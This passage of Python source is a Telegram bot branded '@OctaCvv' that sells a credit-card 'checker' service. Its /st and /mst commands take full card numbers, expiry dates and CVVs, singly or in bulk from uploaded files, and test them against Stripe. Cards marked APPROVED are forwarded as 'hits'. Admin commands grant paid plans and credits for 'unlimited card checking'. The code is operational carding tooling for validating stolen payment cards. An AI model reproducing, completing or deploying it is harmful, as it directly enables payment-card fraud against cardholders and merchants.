                target_user = get_user_data(target_uid)
                target_user["access"] = plan_title.split()[0]
                target_user["is_premium"] = True
                target_user["expire_time"] = time.time() + (days * 86400)
                save_user_db(USER_DB)
                
                send_telegram_msg(chat_id, f"✅ Granted <b>{plan_title} ({days} Days Unlimited)</b> to User ID <code>{target_uid}</code>!")
                
                # Notify User
                notify_text = (
                    f"🎉 <b>Premium Activated!</b>\n\n"
                    f"Your account has been upgraded to <b>{plan_title} ({days} Days Unlimited Access)</b> by Admin @OctaCvv!\n\n"
                    f"Enjoy unlimited card checking!"
                )
                send_telegram_msg(target_uid, notify_text, build_welcome_markup())
                return
            else:
                send_telegram_msg(chat_id, "Usage: <code>/grant <user_id> <core|elite|root></code>")
                return

        elif text.startswith("/addcredits"):
            parts = text.split()
            if len(parts) >= 3:
                target_uid = parts[1]
                try:
                    add_amt = int(parts[2])
                    target_user = get_user_data(target_uid)
                    target_user["credits"] += add_amt
                    save_user_db(USER_DB)
                    send_telegram_msg(chat_id, f"✅ Added {add_amt} Credits to User ID <code>{target_uid}</code>! (Total: {target_user['credits']})")
                    send_telegram_msg(target_uid, f"🎉 <b>{add_amt} Credits Added!</b>\n\nYour new balance is <b>{target_user['credits']} Credits</b>.")
                    return
                except ValueError:
                    pass
            send_telegram_msg(chat_id, "Usage: <code>/addcredits <user_id> <amount></code>")
            return

    if text.startswith("/start"):
        restricted_text = (
            "🔒 <b>Access Restricted</b>\n"
            "___________________________________\n\n"
            "To use this bot, you must join our channel and group.\n\n"
            "<b>Why join?</b>\n"
            "• 🌟 Exclusive content\n"
            "• 🍇 Updates & support\n"
            "• 👑 Community access\n\n"
            "👇 Click the buttons below to join, then Verify."
        )
        send_telegram_msg(chat_id, restricted_text, build_restricted_markup())
        return


    if text.startswith("/st") or text.startswith("/mst"):
        if not is_subscribed(user_id):
            restricted_text = (
                "🔒 <b>Access Restricted</b>\n"
                "___________________________________\n\n"
                "To use this bot, you must join our channel and group.\n\n"
                "<b>Why join?</b>\n"
                "• 🌟 Exclusive content\n"
                "• 🍇 Updates & support\n"
                "• 👑 Community access\n\n"
                "👇 Click the buttons below to join, then Verify."
            )
            send_telegram_msg(chat_id, restricted_text, build_restricted_markup())
            return
        VERIFIED_USERS.add(user_id)

    if text.startswith("/st"):
        ok, remaining = deduct_credits(user_id, 5)
        if not ok:
            no_cred_text = (
                f"⚠️ <b>Credits Exhausted!</b>\n\n"
                f"Your balance: <b>{remaining} Credits</b>.\n"
                f"Checking 1 card requires <b>5 Credits</b>.\n\n"
                f"Please buy premium access to get unlimited card checking!"
            )
            send_telegram_msg(chat_id, no_cred_text, build_welcome_markup())
            return

        cards = extract_cards(text)
        if not cards and extra_text:
            cards = extract_cards(extra_text)
            
        if not cards:
            send_telegram_msg(chat_id, "❌ Please provide a card to check.\nFormat: <code>/st cc|mm|yy|cvv</code>")
            return
        
        card = cards[0]
        status_msg = send_telegram_msg(chat_id, f"⏳ Checking single card: <code>{card}</code>...")
        if not status_msg or not status_msg.get("ok"):
            return
        msg_id = status_msg["result"]["message_id"]
        
        st, response_msg = run(card)
        print(f"[-] Result [{card}]: {st} - {response_msg}\n", flush=True)
        u_data = get_user_data(user_id)
        access_type = u_data.get("access", "Trial")
        is_prem = u_data.get("is_premium") or access_type in ["Core", "Elite", "Root", "Premium", "VIP"]
        rem_str = "∞ Unlimited" if is_prem else f"{remaining} Credits"

        final_text = (
            f"<b>Stripe Card Check Result:</b>\n\n"
            f"<code>{card}</code> → {icon(st)} <b>{st}</b> ({response_msg})\n"
            f"💳 <b>Remaining Credits:</b> {rem_str}\n\n"
            f"<b>By:</b> @OctaCvv"
        )
        edit_telegram_msg(chat_id, msg_id, final_text)
        if st == "APPROVED":
            send_telegram_hit(card, response_msg, user_name=first_name)
        return

    elif text.startswith("/mst"):
        cards = extract_cards(text)
        if not cards and extra_text:
            cards = extract_cards(extra_text)
            
        if not cards:
            send_telegram_msg(chat_id, "❌ Please provide cards to check or upload a txt file and reply /mst.\nFormat:\n<code>/mst cc|mm|yy|cvv</code>")
            return
        
        total_cards = len(cards)
        job_id = f"{chat_id}_{rnd(6)}"
        
        u_data = get_user_data(user_id)
        access_type = u_data.get("access", "Trial")
        is_prem = u_data.get("is_premium") or access_type in ["Core", "Elite", "Root", "Premium", "VIP"]
        rem_val = "∞ Unlimited" if is_prem else u_data.get("credits", 0)

        initial_status = build_status_text(0, total_cards, 0, 0, 0, 0, rem_val)
        initial_markup = build_reply_markup(job_id, 0, total_cards, False)
        status_msg = send_telegram_msg(chat_id, initial_status, initial_markup)
        if not status_msg or not status_msg.get("ok"):
            return
        msg_id = status_msg["result"]["message_id"]

        job = {
            "chat_id": chat_id,
            "msg_id": msg_id,
            "total_cards": total_cards,
            "stop": False,
            "live_cards": [],
            "all_cards": [],
            "counts": {"checked": 0, "live": 0, "dead": 0, "error": 0},
            "start_time": time.time()
        }
        JOBS[job_id] = job
        lock = threading.Lock()
        
        def check_card(c):
            if job["stop"]:
                return

            ok, rem = deduct_credits(user_id, 5)
            if not ok:
                with lock:
                    if not job["stop"]:
                        job["stop"] = True
                        no_cred_text = (
                            f"⚠️ <b>Credits Exhausted!</b>\n\n"
                            f"Checking halted at <b>{job['counts']['checked']}/{total_cards}</b>.\n"
                            f"Your balance: <b>{rem} Credits</b>.\n\n"
                            f"Please buy premium access to continue checking!"
                        )
                        edit_telegram_msg(chat_id, msg_id, no_cred_text, build_welcome_markup())
                return
                
            t_start = time.time()
            st, response_msg = run(c)
            t_elapsed = round(time.time() - t_start, 2)
            print(f"[-] Result [{c}]: {st} - {response_msg} ({t_elapsed}s)\n", flush=True)
            
            with lock:
                if job["stop"]:
                    return
                    
                job["counts"]["checked"] += 1
                job["all_cards"].append((c, st, response_msg))
                
                if st == "APPROVED":
                    job["counts"]["live"] += 1
                    job["live_cards"].append((c, response_msg))
                    send_telegram_hit(c, response_msg, t_elapsed, user_name=first_name)
                elif st == "DECLINED":
                    job["counts"]["dead"] += 1
                else:
                    job["counts"]["error"] += 1
                    
                elapsed_now = time.time() - job["start_time"]
                u_curr = get_user_data(user_id)
                acc_curr = u_curr.get("access", "Trial")
                prem_curr = u_curr.get("is_premium") or acc_curr in ["Core", "Elite", "Root", "Premium", "VIP"]
                rem_curr = "∞ Unlimited" if prem_curr else u_curr.get("credits", 0)

                progress_text = build_status_text(
                    job["counts"]["checked"], total_cards, 
                    job["counts"]["live"], job["counts"]["dead"], job["counts"]["error"], 
                    elapsed_now, rem_curr
                )
                markup = build_reply_markup(job_id, job["counts"]["live"], total_cards, False)
                edit_telegram_msg(chat_id, msg_id, progress_text, markup)

        with ThreadPoolExecutor(max_workers=1) as ex:
            ex.map(check_card, cards)

        final_elapsed = time.time() - job["start_time"]
        final_text = build_status_text(
            job["counts"]["checked"], total_cards, 
            job["counts"]["live"], job["counts"]["dead"], job["counts"]["error"], 
            final_elapsed
        )
        if job["stop"]:
            final_text += "\n\n<b>🛑 Check Stopped!</b>"
        else:
            final_text += "\n\n<b>✅ Check Completed!</b>"
            
        final_markup = build_reply_markup(job_id, job["counts"]["live"], total_cards, True)
        edit_telegram_msg(chat_id, msg_id, final_text, final_markup)
        return

    else:
        # Ignore messages that don't start with /st or /mst or /start
        pass

from concurrent.futures import ThreadPoolExecutor

def process_update(update):
    try:
        if "callback_query" in update:
            handle_callback_query(update["callback_query"])
            return

        msg = update.get("message")
        if not msg:
            return

        chat_id = msg["chat"]["id"]
        chat_type = msg.get("chat", {}).get("type", "")
        if chat_type in ["group", "supergroup"]:
            GROUP_CHAT_IDS.add(chat_id)
            groups = USER_DB.get("group_chat_ids", [])
            if chat_id not in groups:
                groups.append(chat_id)
                USER_DB["group_chat_ids"] = groups
                save_user_db(USER_DB)

        text = (msg.get("text") or msg.get("caption") or "").strip()
        
        # EARLY FILTER: Only process commands!
        valid_commands = ["/st", "/mst", "/start", "/grant", "/addcredits"]
        if not any(text.startswith(cmd) for cmd in valid_commands):
            return

        from_user = msg.get("from")
        doc = msg.get("document")
        replied_msg = msg.get("reply_to_message")
        
        # Only check document if someone explicitly sent /mst command
        if text.startswith("/mst") and not doc and replied_msg:
            doc = replied_msg.get("document")

        file_text = ""
        if doc and text.startswith("/mst"):
            file_text = get_file_content(doc.get("file_id"))

        replied_text = ""
        if replied_msg and "text" in replied_msg:
            replied_text = replied_msg["text"].strip()

        extra_text = (file_text + "\n" + replied_text).strip()
        
        handle_message(chat_id, text, extra_text, from_user)
    except Exception as e:
        print(f"Error processing update: {e}")

def start_bot():
    print("[+] Telegram Bot is running... Press Ctrl+C to stop.")
    offset = 0
    # Use ThreadPoolExecutor to prevent "can't start new thread" limit
    # This ensures max 20 active tasks concurrently, queuing the rest.
    pool = ThreadPoolExecutor(max_workers=20)
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            r = requests.get(url, params={"offset": offset, "timeout": 30}, timeout=35).json()
            if not r.get("ok"):
                time.sleep(5)
                continue
            for update in r.get("result", []):
                offset = update["update_id"] + 1
                pool.submit(process_update, update)
                
        except Exception as e:
            print(f"Error in bot loop: {e}")
            time.sleep(5)

from flask import Flask
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    if not TELEGRAM_BOT_TOKEN:
        print("Error: Please set TELEGRAM_BOT_TOKEN at the top of the file.")
    else:
        threading.Thread(target=run_web_server, daemon=True).start()
        start_bot()
